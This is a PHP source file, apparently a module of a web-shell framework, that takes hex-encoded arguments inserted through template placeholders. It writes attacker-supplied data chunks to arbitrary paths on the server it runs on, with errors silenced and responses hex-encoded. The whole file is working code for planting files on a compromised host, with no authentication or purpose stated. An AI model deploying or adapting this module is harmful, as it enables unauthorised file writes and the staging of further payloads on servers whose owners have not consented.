#<?php


class Module_upload
{
    private $SUCC_CODE        = 0;
    private $ERR_CODE         = 1;

    private $FIELD_SEPARATOR  = ",";
    private $VALUE_SEPARATOR  = "=";
    private $CUSTOM_SEPARATOR = "|";

    private $RESPONSE_STATUS  = "status";
    private $RESPONSE_MESSAGE = "message";

    private $MAX_CHUNK_SIZE   = 1048576; // 1Mb

    private $return_code;

    public function __construct($cwd)
    {
        $this->return_code = $this->SUCC_CODE;
        $cwd = $this->normalizePath($cwd);
        chdir($cwd);
    }

    private function normalizePath($currPath)
    {
        $currPath = str_replace("\"", "", $currPath);
        $currPath = str_replace("'", "", $currPath);
        $currPath = str_replace("\\", "/", $currPath);
        return $currPath;
    }

    private function parseArgs($args)
    {
        preg_match_all('/"[^"]+"|\'[^\']+\'|\S+/', $args, $matches);
        return $matches[0];
    }

    private function generateResponse($result)
    {
        $response  = "";
        $response .= $this->RESPONSE_STATUS . $this->VALUE_SEPARATOR . $this->return_code;
        $response .= $this->FIELD_SEPARATOR;
        $response .= $this->RESPONSE_MESSAGE . $this->VALUE_SEPARATOR . bin2hex($result);
        return bin2hex($response);
    }

    private function write_chunk($filepath, $chunk_data, $seek)
    {
        $fp = @fopen($filepath, 'a');
        @fseek($fp, $seek);
        $bytes_written = @fwrite($fp, $chunk_data);
        @fclose($fp);
        return $bytes_written;
    }

    private function getOS()
    {
        $phpuname_fields = explode(" ", php_uname());
        return $phpuname_fields[0];
    }

    private function doUpload($filepath, $filesize, $seek, $chunk_size, $chunk_data)
    {
        $output = "";
        $checksum = "";
        $filepath = $this->normalizePath($filepath);

        if ($this->getOS() !== "Windows" && @is_writable(@dirname($filepath)) === false)
            throw new Exception("can't perform stat on '$filepath': Permission denied");

        if (!@is_numeric($filesize))
            throw new Exception("invalid file size '$filesize': not a number");

        if (!@is_numeric($seek))
            throw new Exception("invalid seek position '$seek': not a number");

        if (!@is_numeric($chunk_size))
            throw new Exception("invalid chunk size '$chunk_size': not a number");

        $seek_position = intval($seek);
        if ($seek_position === 0 && @file_exists($filepath))
            throw new Exception("can't perform stat on '$filepath': File or directory exist");

        $file_size = @intval($filesize);
        $free_space = @intval(@disk_free_space(@dirname($filepath)));
        if ($free_space < $file_size)
            throw new Exception("file size: '$file_size' exceeds '$free_space' of free space");

        $chunk_size_value = intval($chunk_size);
        if ($chunk_size_value > $this->MAX_CHUNK_SIZE)
            throw new Exception("chunk size: '$file_size' exceeds MAX_CHUNK_SIZE: '".$this->MAX_CHUNK_SIZE."'");

        if ($file_size < $seek_position)
            throw new Exception("invalid seek position '$seek': exceeds '$filepath' total length '$file_size'");

        $chunk_data_raw = @hex2bin($chunk_data);
        $bytes_written = $this->write_chunk($filepath, $chunk_data_raw, $seek_position);
        if ($bytes_written === false)
            throw new Exception("write chunk in seek '$seek' into '$filepath': Failed");

        if (($bytes_written < $chunk_size_value) || ($file_size <= ($seek_position + $chunk_size_value)))
            $checksum = @md5_file($filepath);
        
        $response  = "";
        $response .= $this->RESPONSE_STATUS . $this->VALUE_SEPARATOR . $this->return_code;
        $response .= $this->FIELD_SEPARATOR;
        $response .= $this->RESPONSE_MESSAGE . $this->VALUE_SEPARATOR;
        $response .= bin2hex(strval($bytes_written)) . $this->CUSTOM_SEPARATOR . bin2hex($checksum);
        return bin2hex($response);
    }

    public function execute($args)
    {
        try
        {
            $parsed_args = $this->parseArgs(hex2bin($args));
            
            if (sizeof($parsed_args) !== 5)
                throw new Exception("Invalid arguments provided. Specify a filepath to upload, file size, seek, chunk size and chunk data");

            return $this->doUpload($parsed_args[0], $parsed_args[1], $parsed_args[2], $parsed_args[3], $parsed_args[4]);
        }
        catch (Exception $e)
        {
            $this->return_code = $this->ERR_CODE;
            return $this->generateResponse($e->getMessage() . PHP_EOL);
        }
    }
}


$cwd = '#{CWD}';
$args = '#{ARGS}';
$module = new Module_upload($cwd);
print($module->execute($args));